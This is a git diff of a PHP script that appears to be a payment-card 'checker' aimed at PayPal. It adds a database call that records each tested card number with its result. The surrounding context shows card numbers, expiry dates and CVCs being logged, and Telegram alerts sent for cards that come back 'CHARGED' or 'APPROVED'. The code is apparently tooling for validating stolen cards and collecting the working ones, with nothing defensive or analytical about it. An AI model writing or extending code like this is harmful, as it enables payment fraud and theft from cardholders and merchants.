@@ -27,6 +27,9 @@ header('Content-Type: application/json');
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
 
+// Include globalstats.php for recordCardCheck function
+require_once __DIR__ . '/globalstats.php';
+
 // --- MOVED log_message function to the top to prevent 500 errors ---
 // Optional file-based logging for debugging
  $log_file = __DIR__ . '/paypal0.1$_debug.log';
@@ -351,6 +354,9 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
         $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
         $result = "$status [$response_msg]";
         log_message("$status for $card_details: $response_msg");
+        
+        // Record the card check result in the database
+        recordCardCheck($GLOBALS['pdo'], $card_number, $status, $response_msg);
 
         // Send Telegram notification for CHARGED or APPROVED
         if ($status === 'CHARGED' || $status === 'APPROVED') {
